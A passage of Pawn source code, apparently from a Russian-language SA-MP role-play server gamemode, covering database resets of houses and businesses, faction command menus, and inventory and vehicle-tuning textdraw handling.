			format(query, sizeof(query), "UPDATE `testhouse` SET `hOwner` = 'None',`hOplata` = 0,`hLock` = 0,`hZasel1` = 'None',`hZasel2` = 'None',`hZasel3` = 'None',`hZasel4` = 'None'  WHERE id = '%d' LIMIT 1", i);
			mysql_tquery(mysql,query);
		}
	}
}
stock SaveMebel(slot,house)
{
    query = "";
	format(query, sizeof(query), "UPDATE `testhouse` SET `gHouseFurniture%d` = '%d,%.2f,%.2f,%.2f,%.2f,%.2f,%.2f' WHERE id = '%d' LIMIT 1", slot+1,MebelInfo[slot][house][mmodel]
	, MebelInfo[slot][house][mx], MebelInfo[slot][house][my], MebelInfo[slot][house][mz], MebelInfo[slot][house][mrx], MebelInfo[slot][house][mry]
	, MebelInfo[slot][house][mrz],house);
	mysql_tquery(mysql,query);
	return 1;
}
CMD:clearall(playerid)
{
    if(PlayerInfo[playerid][pAdmin] < 6|| AdminLogged[playerid] == false ) return true;
/*    for(new i = 1; i <= PRODAJ; i++)
    {
		format(query, sizeof(query), "UPDATE `sas` SET `kup` = 0, `nal` = 0 WHERE id = '%d' LIMIT 1", i);
		mysql_tquery(mysql,query);
	}*/
	for(new i = 1; i <= TOTALHOUSE; i++)
	{
		query = "";
		format(query, sizeof(query), "UPDATE testhouse SET hOwner = 'None',hOplata = 0,hLock = 0,hZasel1 = 'None',hZasel2 = 'None',hZasel3 = 'None',hZasel4 = 'None',ul1 = 0,ul2 = 0,ul3 = 0  WHERE id = '%d' LIMIT 1", i);
		mysql_tquery(mysql,query);
	}
	for(new i = 0; i < TOTALBIL; i++)
    {
        query = "";
		format(query, sizeof(query), "UPDATE `billboards` SET `bDay` = 0, `bOwner` = 'None', `bText` = '-', `bFontSize` = 25, `bAligment` = 1, `bBackColor` = 1, `bFontFace` = 0 WHERE `id` = %i",i);
		mysql_tquery(mysql,query);
    }
	for(new i = 1; i<=TOTALBIZ; i++)
	{
		query = "";
		format(query, sizeof(query), "UPDATE `biz` SET `owner` = 'None',`lock` = 0,`prod` = 5000,`price` = 200000,`money` = 0, `menedger` = 'None',ul1 = 0,ul2 = 0,ul3= 0,ul4 = 0,ul5 = 0 WHERE `id` = '%d' LIMIT 1", i);
		mysql_tquery(mysql,query);
	}
	return true;
}
stock MyCom(playerid)
{
	switch(PlayerInfo[playerid][pMember])
	{
	    case F_BIKERS,F_LCN,F_RM,F_YAKUZA:
	    {
			ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация","{FFFFFF}/f (/fb) - чат организации IC (OOC)\n\n/sellgun - продать оружие\n\n/selldrugs - продать наркотики\n\n/warehouse - закрыть склад\n\n/bizlist - список захваченых бизнесрв","Назад","");
	    }
	    case F_GROVE,F_BALLAS,F_RIFA,F_AZTECAS,F_VAGOS: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация","{FFFFFF}/f (/fb) - чат организации IC (OOC)\n\n/sellgun - продать оружие\n\n/warehouse - закрыть склад\n\n/capture - начать войну","Назад","");
	    case F_LIC: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация","{FFFFFF}/r (/rb) - чат организации IC (OOC)\n\n/d (/db) - чат депортамента IC (OOC)\n\n/test - начать тест\n\n/gl - продать лицензию\n\n/take - отобрать лицензию","Назад","");
	    case F_NEWS: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация","{FFFFFF}/r (/rb) - чат организации IC (OOC)\n\n/ads - панель объявлений\n\n/news - панель новостей\n\n/acall - принять звонок\n\n/ccall - отклонить звонок","Назад","");
	    case F_HOSPITAL_LS: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация","{FFFFFF}/r (/rb) - чат организации IC (OOC)\n\n/d (/db) - чат депортамента IC (OOC)\n\n/heal - вылечить игрока\n\n/setsex - сменить пол игроку\n\n/helpdrugs - избавить от ломки\n\n/healdrugs - курс от наркозависимости","Назад","");
		case F_ARMY: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация","{FFFFFF}/r (/rb) - чат организации IC (OOC)\n\n/d (/db) - чат депортамента IC (OOC)\n\n/warehouse - закрыть склад\n\n/loadmats - загрузить материалы","Назад","");
		case F_MAYOR: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация","{FFFFFF}/r (/rb) - чат организации IC (OOC)\n\n/d (/db) - чат депортамента IC (OOC)\n\n/free - выпустить игрока из тюрьмы","Назад","");
		case F_LVPD,F_LSPD:
		{
		    query = "";
			strcat(query,"{FFFFFF}/r (/rb) - чат организации IC (OOC)\n\n/d (/db) - чат депортамента IC (OOC)\n\n/su - объявить в розыск\n\n/wanted - список разыскиваемых\n\n/ticket - выписать штраф\n\n/find - найти игрока\n\n/findcar - найти машину\n\n/take - отобрать лицензию\n\n/cuff - одеть наручники\n\n/frisk - обыскать\n\n/warehouse - закрыть склад\n\n/cput - затащить игрока в машину\n\n/ceject - вытолкнуть из транспорта\n\n/attach (/unattach) - тащить игрока за собой (отпустить)\n\n/tazer - тазер");
            strcat(query,"\n\n/takeo - отобрать наркотики/материалы\n\n/m - мегафон\n\n/obj - установить объект\n\n/cb - вызвать подкрепление\n\n/arrest - посадить в тюрьму\n\n/pcarpass - информация о транспорте");
			ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация",query,"Назад","");
		}
		case F_FBI:
		{
		    query = "";
			strcat(query,"{FFFFFF}/r (/rb) - чат организации IC (OOC)\n\n/d (/db) - чат депортамента IC (OOC)\n\n/su - объявить в розыск\n\n/wanted - список разыскиваемых\n\n/ticket - выписать штраф\n\n/find - найти игрока\n\n/findcar - найти машину\n\n/take - отобрать лицензию\n\n/cuff - одеть наручники\n\n/frisk - обыскать\n\n/warehouse - закрыть склад\n\n/cput - затащить игрока в машину\n\n/ceject - вытолкнуть из транспорта\n\n/attach (/unattach) - тащить игрока за собой (отпустить)\n\n/tazer - тазер");
            strcat(query,"\n\n/takeo - отобрать наркотики/материалы\n\n/m - мегафон\n\n/obj - установить объект\n\n/cb - вызвать подкрепление\n\n/arrest - посадить в тюрьму\n\n/pcarpass - информация о транспорте\n\n/wt - установить прослушку");
			ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация",query,"Назад","");
		}
		default: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Организация","{FFFFFF}Вы нигде не состоите","Назад","");
	}
}
stock CloseInv(playerid)
{
    DeletePVar(playerid,"InvS");
	DeletePVar(playerid,"InvOpen");
	DeletePVar(playerid,"SetCehck");
	for(new i = 0; i < 39; i++) TextDrawHideForPlayer(playerid,Inventory[i] );
	for(new i = 0; i < 47; i++) PlayerTextDrawDestroy(playerid,InventoryP[i][playerid]);
	for(new i = 0; i < 6; i++) PlayerTextDrawDestroy(playerid,ActionInventoryP[i][playerid]);
	for(new i = 0; i < 36; i++) PlayerTextDrawDestroy(playerid,InvAmm[playerid][i]);
	CancelSelectTextDraw(playerid);
	return 1;
}
stock CloseTD(playerid)
{
    CancelSelectTextDraw(playerid);
    for(new i = 0; i <= 14; i++) PlayerTextDrawDestroy(playerid,SkinsTD[playerid][i]);
    DeletePVar(playerid,"SelectSkinRank");
    return 1;
}
public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
    if((_:playertextid == INVALID_TEXT_DRAW) && GetPVarInt(playerid,"TextDrawSelect"))
	{
	    if(GetPVarInt(playerid,"InvOpen")) CloseInv(playerid);
	    else if(GetPVarInt(playerid,"OpenHouse") || GetPVarInt(playerid,"OpenTrunk") || GetPVarInt(playerid,"OpenTorg") || GetPVarInt(playerid,"OpenBlackTorg"))
	    {
	        if(GetPVarInt(playerid,"OpenHouse")) SaveHouseInv(GetPVarInt(playerid,"PlayerHouse"));
		    DeletePVar(playerid,"OpenHouse");
		    DeletePVar(playerid,"OpenTrunk");
		    DeletePVar(playerid,"SetCehck");
			for(new i = 0; i < 16; i++)
			{
		 		if(i < 15) TextDrawHideForPlayer(playerid,Inventory[i]);
		 		TextDrawHideForPlayer(playerid,Inventory1[i]);
			}
			TextDrawHideForPlayer(playerid,Inventory[22]);
			for(new i = 0; i < 36; i++)
			{
			    PlayerTextDrawDestroy(playerid,InventoryP1[i][playerid]);
				PlayerTextDrawDestroy(playerid,InventoryP[i][playerid]);
				PlayerTextDrawDestroy(playerid,InvAmm[playerid][i]);
				PlayerTextDrawDestroy(playerid,InvAmm1[playerid][i]);
			}
		 	CancelSelectTextDraw(playerid);
		 	return 1;
	    }
	    else if(GetPVarInt(playerid,"STO"))
	    {
     		for(new i = 0; i < 33; i++) TextDrawHideForPlayer(playerid,Tuning[i]);
	    	for(new i = 0; i < 14; i++) PlayerTextDrawDestroy(playerid,TuningP[i][playerid]);
	        new carid = GetPlayerVehicleID(playerid);
		    SetVehiclePos(carid,2309.8481,1795.1025,10.8203);
			SetVehicleZAngle(carid,-349.5503);
			LinkVehicleToInterior(carid,0);
			SetVehicleVirtualWorld(carid,0);
			SetPlayerVirtualWorld(playerid,0);
			SetPlayerInterior(playerid,0);
			PutPlayerInVehicle(playerid,carid,0);
		    DeletePVar(playerid,"STO");
			DeletePVar(playerid,"ATune");
			TogglePlayerControllable(playerid, 1);
			SetCameraBehindPlayer(playerid);
			CancelSelectTextDraw(playerid);
	    }
	    else SelectTextDraw(playerid, 0xAFAFAFAA);
	}
	if(GetPVarInt(playerid,"STO"))
	{

	    if(playertextid >= TuningP[0][playerid] && playertextid <= TuningP[11][playerid])
	    {
	        new x = GetPVarInt(playerid,"ColorsPage")*12;
			for(new i = 0; i < 12; i++)
			{
			    if(playertextid != TuningP[i][playerid]) continue;
			    SetPVarInt(playerid,"Color1",x+i);
				SetPVarInt(playerid,"Color2",x+i);
				ChangeVehicleColor(GetPlayerVehicleID(playerid), x+i, x+i);
				ShowPlayerDialog(playerid,131,DIALOG_STYLE_MSGBOX,"Цвет","{FFFFFF}Вы хотите перекрасить авто в данный цвет?\nЦена: $3000","Да","Нет");
				break;
			}
	        
	    }
	    new CarColHex[121] = {
		0x000000FF,0xF5F5F5FF,0x2A77A1FF,0x840410FF,0x263739FF,0x86446EFF,0xD78E10FF,0x4C75B7FF,
		0xBDBEC6FF,0x5E7072FF,0x46597AFF,0x656A79FF,0x5D7E8DFF,0x58595AFF,0xD6DAD6FF,0x9CA1A3FF,
		0x335F3FFF,0x730E1AFF,0x7B0A2AFF,0x9F9D94FF,0x3B4E78FF,0x732E3EFF,0x691E3BFF,0x96918CFF,
		0x515459FF,0x3F3E45FF,0xA5A9A7FF,0x635C5AFF,0x3D4A68FF,0x979592FF,0x421F21FF,0x5F272BFF,
		0x8494ABFF,0x767B7CFF,0x646464FF,0x5A5752FF,0x252527FF,0x2D3A35FF,0x93A396FF,0x6D7A88FF,
		0x221918FF,0x6F675FFF,0x7C1C2AFF,0x5F0A15FF,0x193826FF,0x5D1B20FF,0x9D9872FF,0x7A7560FF,
		0x989586FF,0xADB0B0FF,0x848988FF,0x304F45FF,0x4D6268FF,0x162248FF,0x272F4BFF,0x7D6256FF,
		0x9EA4ABFF,0x9C8D71FF,0x6D1822FF,0x4E6881FF,0x9C9C98FF,0x917347FF,0x661C26FF,0x949D9FFF,
		0xA4A7A5FF,0x8E8C46FF,0x341A1EFF,0x6A7A8CFF,0xAAAD8EFF,0xAB988FFF,0x851F2EFF,0x6F8297FF,
		0x585853FF,0x9AA790FF,0x601A23FF,0x20202CFF,0xA4A096FF,0xAA9D84FF,0x78222BFF,0x0E316DFF,
		0x722A3FFF,0x7B715EFF,0x741D28FF,0x1E2E32FF,0x4D322FFF,0x7C1B44FF,0x2E5B20FF,0x395A83FF,
		0x6D2837FF,0xA7A28FFF,0xAFB1B1FF,0x364155FF,0x6D6C6EFF,0x0F6A89FF,0x204B6BFF,0x2B3E57FF,
		0x9B9F9DFF,0x6C8495FF,0x4D5D60FF,0xAE9B7FFF,0x406C8FFF,0x1F253BFF,0xAB9276FF,0x134573FF,
		0x96816CFF,0x64686AFF,0x105082FF,0xA19983FF,0x385694FF,0x525661FF,0x7F6956FF,0x8C929AFF,
		0x596E87FF,0x473532FF,0x44624FFF,0x730A27FF,0x223457FF,0x640D1BFF,0xA3ADC6FF,0x695853FF};
		
	    if(playertextid == TuningP[12][playerid]) // -
		{
			SetPVarInt(playerid,"ColorsPage",GetPVarInt(playerid,"ColorsPage")-1);
			if(GetPVarInt(playerid,"ColorsPage") < 0) SetPVarInt(playerid,"ColorsPage",10);
			new x = GetPVarInt(playerid,"ColorsPage")*12;
			for(new i = 0; i < 12; i++)
			{
			    PlayerTextDrawHide(playerid,TuningP[i][playerid]);
			    PlayerTextDrawColor(playerid, TuningP[i][playerid], CarColHex[x+i]);
			    PlayerTextDrawShow(playerid,TuningP[i][playerid]);
			}
		}
		if(playertextid == TuningP[13][playerid]) // +
		{
            SetPVarInt(playerid,"ColorsPage",GetPVarInt(playerid,"ColorsPage")+1);
			if(GetPVarInt(playerid,"ColorsPage") > 10) DeletePVar(playerid,"ColorsPage");
			new x = GetPVarInt(playerid,"ColorsPage")*12;
			for(new i = 0; i < 12; i++)
			{
			    PlayerTextDrawHide(playerid,TuningP[i][playerid]);
			    PlayerTextDrawColor(playerid, TuningP[i][playerid], CarColHex[x+i]);
			    PlayerTextDrawShow(playerid,TuningP[i][playerid]);
			}
		}
	}
	if(playertextid == ActionInventoryP[1][playerid] && GetPVarInt(playerid,"InvOpen"))
	{
	    new i = GetPVarInt(playerid,"SetInvID"),kek;
	    
	    for(new d; d < sizeof(MusorPos); d++)
		{
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, MusorPos[d][0],MusorPos[d][1],MusorPos[d][2])) continue;
		    kek++;
	/*	    switch(InvInfo[playerid][iStol][i])
		    {
		        case 315: PlayerInfo[playerid][pTie] = 0;
		        case 316: PlayerInfo[playerid][pMask] = 0;
		        case 317: PlayerInfo[playerid][pPhone] = 0;
		        case 319: PlayerInfo[playerid][pSmoke] = 0;
		        case 319: PlayerInfo[playerid][pSmoke] = 0;
		    }*/
			InvMinus(playerid,InvInfo[playerid][iSlot][i],InvInfo[playerid][iKol][i]);

			for(new x = 0; x < 6; x++) PlayerTextDrawHide(playerid,ActionInventoryP[x][playerid]);

			PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
			PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 589505535);
			PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
			DeletePVar(playerid,"SetCehck");
		    break;
		}
		if(!kek) return SendClientMessage(playerid,CGREY,"Вы должны находиться у мусорного бака!");
	}
	if(playertextid == ActionInventoryP[2][playerid] && GetPVarInt(playerid,"InvOpen"))
	{
	    new i = GetPVarInt(playerid,"SetInvID");
	    static const fmt_string1[] = "{ffffff}Количество: {f7ae11}%i{ffffff}\nОписание:\n\n%s";
		new str1[sizeof(fmt_string1)+128];
		format(str1, sizeof(str1), fmt_string1,InvInfo[playerid][iKol][i],InvType[InvInfo[playerid][iSlot][i]][invTitle]);
	    ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,InvType[InvInfo[playerid][iSlot][i]][invText],str1,"Закрыть","");
	}
	if(playertextid == ActionInventoryP[0][playerid] && GetPVarInt(playerid,"InvOpen"))
	{
	    new i = GetPVarInt(playerid,"SetInvID");
        switch(InvInfo[playerid][iSlot][i])
        {
            case 0..311: return SendClientMessage(playerid,CGREY,"Для переодевания используйте гардероб в доме");
            case 317: cmd_phone(playerid);
            case 449: cmd_lic(playerid,"");
            case 448,315,337: return SendClientMessage(playerid,CGREY,"Данный предмет нельзя использовать");
            case 446: cmd_taxi(playerid),CancelCheck(playerid);
            case 458:
            {
                CloseInv(playerid);
                cmd_hack(playerid);
            }
            case 445:
			{
			    CloseInv(playerid);
				cmd_opencase(playerid),CancelCheck(playerid);
			}
            case 319:
			{
			    CloseInv(playerid);
				cmd_smoke(playerid),CancelCheck(playerid);
			}
			case 320: cmd_healme(playerid),CancelCheck(playerid);
			case 322: cmd_fillcar(playerid),CancelCheck(playerid);
			case 316: cmd_mask(playerid);
			case 453:
			{
   				if(GetPVarInt(playerid,"Burger")) return 1;
   				InvMinus(playerid,453,1);
			    SendClientMessage(playerid,-1,"Чтобы съесть, используйте: {f7ae11}ЛКМ");
				SetPlayerAttachedObject(playerid, 2, 2703, 5, 0.060999, 0.044999, -0.014000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000, 0, 0),SetPVarInt(playerid,"Burger",1);
                CloseInv(playerid);
			}
			case 454:
   			{
	     		if(GetPVarInt(playerid,"Burger")) return 1;
	     		InvMinus(playerid,454,1);
			    SendClientMessage(playerid,-1,"Чтобы съесть, используйте: {f7ae11}ЛКМ");
				SetPlayerAttachedObject(playerid, 2, 2702, 5, 0.060999, 0.100999, 0.005000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000, 0, 0),SetPVarInt(playerid,"Burger",1);
                CloseInv(playerid);
			}
			case 313:
			{
			    if(GetPVarInt(playerid,"UseSp")) return 1;
			    InvMinus(playerid,313,1);
			    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_SPRUNK),SetPVarInt(playerid,"UseSp",7);
			    static const fmt_string1[] = "Нажимайте ЛКМ, для того чтобы пить. Sprunk на %i раз";
				new str1[sizeof(fmt_string1)+10+20];
				format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"UseSp"));
				SendClientMessage(playerid,CGREEN,str1);
				CloseInv(playerid);
			}
			case 314:
			{
			    if(GetPVarInt(playerid,"UseSp")) return 1;
			    InvMinus(playerid,314,1);
			    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_BEER),SetPVarInt(playerid,"UseSp",13);
			    static const fmt_string1[] = "Нажимайте ЛКМ, для того чтобы пить. Пиво на %i раз";
				new str1[sizeof(fmt_string1)+10+20];
				format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"UseSp"));
				SendClientMessage(playerid,CGREEN,str1);
				CloseInv(playerid);
			}
			case 450:
			{
			    if(GetPVarInt(playerid,"UseSp")) return 1;
			    InvMinus(playerid,450,1);
			    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE),SetPVarInt(playerid,"UseSp",13),SetPVarInt(playerid,"Buhlo",1);
			    static const fmt_string1[] = "Нажимайте ЛКМ, для того чтобы пить. Вино на %i раз";
				new str1[sizeof(fmt_string1)+10+20];
				format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"UseSp"));
				SendClientMessage(playerid,CGREEN,str1);
				CloseInv(playerid);
			}
			case 451:
			{
			    if(GetPVarInt(playerid,"UseSp")) return 1;
			    InvMinus(playerid,451,1);
			    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE),SetPVarInt(playerid,"UseSp",13),SetPVarInt(playerid,"Buhlo",2);
			    static const fmt_string1[] = "Нажимайте ЛКМ, для того чтобы пить. Коньяк на %i раз";
				new str1[sizeof(fmt_string1)+10+20];
				format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"UseSp"));
				SendClientMessage(playerid,CGREEN,str1);
				CloseInv(playerid);
			}
			case 452:
			{
			    if(GetPVarInt(playerid,"UseSp")) return 1;
			    InvMinus(playerid,452,1);
			    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DRINK_WINE),SetPVarInt(playerid,"UseSp",13),SetPVarInt(playerid,"Buhlo",3);
			    static const fmt_string1[] = "Нажимайте ЛКМ, для того чтобы пить. Абсент на %i раз";
				new str1[sizeof(fmt_string1)+10+20];
				format(str1, sizeof(str1), fmt_string1,GetPVarInt(playerid,"UseSp"));
				SendClientMessage(playerid,CGREEN,str1);
				CloseInv(playerid);
			}
            case 441:
			{
			    new str[5];
			    format(str,sizeof(str),"%d",playerid);
				cmd_pass(playerid,str);
			}
            case 342..375,429..435: //голов
            {
				if(PlayerInfo[playerid][pAcs][0])
				{
				    new acs = PlayerInfo[playerid][pAcs][0];
				    PlayerInfo[playerid][pAcs][0] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				    InvInfo[playerid][iSlot][i] = GiveID(acs);
				    
				}
				else
				{
				    PlayerInfo[playerid][pAcs][0] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				    GiveItem(playerid,InvType[InvInfo[playerid][iSlot][i]][invObj]);
					InvMinus(playerid,InvInfo[playerid][iSlot][i],1);
				

				}
			 	if(GetPVarInt(playerid,"InvOpen")) CheckAcs(playerid,i,PlayerInfo[playerid][pAcs][0],37);
            }
            case 376..393: //очки
             {
				if(PlayerInfo[playerid][pAcs][1])
				{
				    new acs = PlayerInfo[playerid][pAcs][1];
				    PlayerInfo[playerid][pAcs][1] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				    InvInfo[playerid][iSlot][i] = GiveID(acs);
				}
				else
				{
				    PlayerInfo[playerid][pAcs][1] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				    GiveItem(playerid,InvType[InvInfo[playerid][iSlot][i]][invObj]);
					InvMinus(playerid,InvInfo[playerid][iSlot][i],1);
		
			

				}
				if(GetPVarInt(playerid,"InvOpen")) CheckAcs(playerid,i,PlayerInfo[playerid][pAcs][1],38);

            }
            case 409..421: //часы
			 {
				if(PlayerInfo[playerid][pAcs][2])
				{
				    new acs = PlayerInfo[playerid][pAcs][2];
				    PlayerInfo[playerid][pAcs][2] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				    InvInfo[playerid][iSlot][i] = GiveID(acs);
				}
				else
				{
				    PlayerInfo[playerid][pAcs][2] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				   	GiveItem(playerid,InvType[InvInfo[playerid][iSlot][i]][invObj]);
					InvMinus(playerid,InvInfo[playerid][iSlot][i],1);
				
				

				}
				if(GetPVarInt(playerid,"InvOpen")) CheckAcs(playerid,i,PlayerInfo[playerid][pAcs][2],39);

            }
			case 422..424,327: //сумка
			 {
				if(PlayerInfo[playerid][pAcs][5])
				{
				    new acs = PlayerInfo[playerid][pAcs][5];
				    PlayerInfo[playerid][pAcs][5] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				    InvInfo[playerid][iSlot][i] = GiveID(acs);
				}
				else
				{
				    PlayerInfo[playerid][pAcs][5] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				    GiveItem(playerid,InvType[InvInfo[playerid][iSlot][i]][invObj]);
					InvMinus(playerid,InvInfo[playerid][iSlot][i],1);

				

				}
				if(GetPVarInt(playerid,"InvOpen")) CheckAcs(playerid,i,PlayerInfo[playerid][pAcs][5],42);

            }
			case 394..403: //бандана
			 {
				if(PlayerInfo[playerid][pAcs][3])
				{
				    new acs = PlayerInfo[playerid][pAcs][3];
				    PlayerInfo[playerid][pAcs][3] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				    InvInfo[playerid][iSlot][i] = GiveID(acs);
				}
				else
				{
				    PlayerInfo[playerid][pAcs][3] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				   	GiveItem(playerid,InvType[InvInfo[playerid][iSlot][i]][invObj]);
					InvMinus(playerid,InvInfo[playerid][iSlot][i],1);
			
				

				}
				if(GetPVarInt(playerid,"InvOpen")) CheckAcs(playerid,i,PlayerInfo[playerid][pAcs][3],40);

            }



		   case 323..326,328..336,442..444:
     		{
     		    //printf("modelid: %d",InvInfo[playerid][iSlot][i]);
               	new gun = GiveGunObj(InvInfo[playerid][iSlot][i]);
			//	printf("gun: %d",gun);
				new slot = Slot(gun);
				//printf("slot: %d",gun);
				if(GunInfo[playerid][pWeapon][slot] != gun)
				{
				    new gunid = GunInfo[playerid][pWeapon][slot];
				    new kolvo = GunInfo[playerid][pAmmo][slot];
				    GunInfo[playerid][pWeapon][slot] = gun;
				    GunInfo[playerid][pAmmo][slot] = InvInfo[playerid][iKol][i];
					SetPVarInt(playerid,"GiveGun",1);
					ResetPlayerWeapons(playerid);
					GivePatr(playerid);
				    InvMinus(playerid,InvInfo[playerid][iSlot][i],InvInfo[playerid][iKol][i]);
				    GiveInv(playerid,GiveID(gunid),kolvo);
				}
				else
				{
				    InvMinus(playerid,InvInfo[playerid][iSlot][i],InvInfo[playerid][iKol][i]);
				    GivePlayerWeapon(playerid,gun,InvInfo[playerid][iKol][i]);
				    new str[5];
					format(str,sizeof(str),"%d",InvInfo[playerid][iKol][i]);
					PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
					CancelCheck(playerid);
				}
            }
			case 338..341: //наушники
			 {
				if(PlayerInfo[playerid][pAcs][4])
				{
				    new acs = PlayerInfo[playerid][pAcs][4];
				    PlayerInfo[playerid][pAcs][4] = InvType[InvInfo[playerid][iSlot][i]][invObj];
					InvInfo[playerid][iSlot][i] = GiveID(acs);
				}
				else
				{
				    PlayerInfo[playerid][pAcs][4] = InvType[InvInfo[playerid][iSlot][i]][invObj];
				    GiveItem(playerid,InvType[InvInfo[playerid][iSlot][i]][invObj]);
					InvMinus(playerid,InvInfo[playerid][iSlot][i],1);
		
					
				}
				if(GetPVarInt(playerid,"InvOpen")) CheckAcs(playerid,i,PlayerInfo[playerid][pAcs][4],41);

            }
        }
	}
    for(new i = 37; i <= 42; i++)
	{
    	if(playertextid != InventoryP[i][playerid] || !PlayerInfo[playerid][pAcs][i-37]) continue;
    	new acsid = GiveID(PlayerInfo[playerid][pAcs][i-37]);
    	if(GetFree(playerid,acsid,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инветаре!");
		GiveInv(playerid,acsid,1);
		PlayerInfo[playerid][pAcs][i-37] = 0;
		PlayerTextDrawHide(playerid,InventoryP[i][playerid]);
		PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], 0);
		PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
		PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
		switch(i-37)
	    {
	        case 0: if(IsPlayerAttachedObjectSlotUsed(playerid, 0)) RemovePlayerAttachedObject(playerid, 0);
            case 1: if(IsPlayerAttachedObjectSlotUsed(playerid, 7)) RemovePlayerAttachedObject(playerid, 7);
            case 2: if(IsPlayerAttachedObjectSlotUsed(playerid, 8)) RemovePlayerAttachedObject(playerid, 8);
            case 3: if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
            case 4: if(IsPlayerAttachedObjectSlotUsed(playerid, 4)) RemovePlayerAttachedObject(playerid, 4);
            case 5: if(IsPlayerAttachedObjectSlotUsed(playerid, 6)) RemovePlayerAttachedObject(playerid, 6);
	    }
	}
    if(GetPVarInt(playerid,"OpenHouse") || GetPVarInt(playerid,"OpenTrunk") || GetPVarInt(playerid,"OpenTorg") || GetPVarInt(playerid,"OpenBlackTorg"))
    {
		for(new i = 0; i < 36; i++)
		{
		    if(playertextid !=  InventoryP1[i][playerid]) continue;
		    new stratica1;
		    if(GetPVarInt(playerid,"OpenHouse"))
			{
			    stratica1 = (!GetPVarInt(playerid,"InvS1")) ? (0) : (36);
			    if(HInfo[GetPVarInt(playerid,"PlayerHouse")][hInvSlot][i+stratica1])
			    {
					PlayerTextDrawHide(playerid,InventoryP1[i][playerid]);
					PlayerTextDrawBackgroundColor(playerid, InventoryP1[i][playerid], 0xFFCC00FF);
					PlayerTextDrawShow(playerid,InventoryP1[i][playerid]);
					SetPVarInt(playerid,"SetInvID",i+stratica1);
					SetPVarInt(playerid,"SetInv",i);
					ShowPlayerDialog(playerid,466,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
				}
			}
			if(GetPVarInt(playerid,"OpenTrunk"))
			{
			    stratica1 = (!GetPVarInt(playerid,"InvS1")) ? (0) : (36);
			    if(BInfo[GetPVarInt(playerid,"Car")][bInvSlot][i+stratica1])
			    {
					PlayerTextDrawHide(playerid,InventoryP1[i][playerid]);
					PlayerTextDrawBackgroundColor(playerid, InventoryP1[i][playerid], 0xFFCC00FF);
					PlayerTextDrawShow(playerid,InventoryP1[i][playerid]);
					SetPVarInt(playerid,"SetInvID",i+stratica1);
					SetPVarInt(playerid,"SetInv",i);
					ShowPlayerDialog(playerid,466,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
				}
			}
			if(GetPVarInt(playerid,"OpenTorg"))
			{
			    stratica1 = 0;
			    if(TorgInfo[tSlot][i+stratica1])
			    {
					PlayerTextDrawHide(playerid,InventoryP1[i][playerid]);
					PlayerTextDrawBackgroundColor(playerid, InventoryP1[i][playerid], 0xFFCC00FF);
					PlayerTextDrawShow(playerid,InventoryP1[i][playerid]);
					SetPVarInt(playerid,"SetInvID",i+stratica1);
					SetPVarInt(playerid,"SetInv",i);
					if(TorgInfo[tIDacc][i+stratica1] != PlayerInfo[playerid][pID])
					{
					    new str[70];
						format(str,sizeof(str),"{ffffff}Введите сколько хотите купить товара:\n\nЦена за шт.: {f7ae11}%d$",TorgInfo[tPrice][i+stratica1]);
						ShowPlayerDialog(playerid,491,DIALOG_STYLE_INPUT,"Введите количество","{ffffff}Введите сколько хотите положить:\n\n","Далее","Отмена");
					}
					else ShowPlayerDialog(playerid,492,DIALOG_STYLE_LIST,"Управление","{20BA09}1 | Добавить товар\n{ffffff}2 | Изменить цену на товар\n{F85A5A}3 | Снять товар с продажи","Далее","Отмена");
				}
			}
		}
	}
	for(new i = 0; i <= 5; i++)
	{
		
    	if(playertextid !=  InventoryP[i][playerid] || !GunInfo[playerid][pAmmo][i+1]) continue;
    	if(GetPVarInt(playerid,"OpenHouse")) return SendClientMessage(playerid,CGREY,"Переложите оружие в инвентарь!");
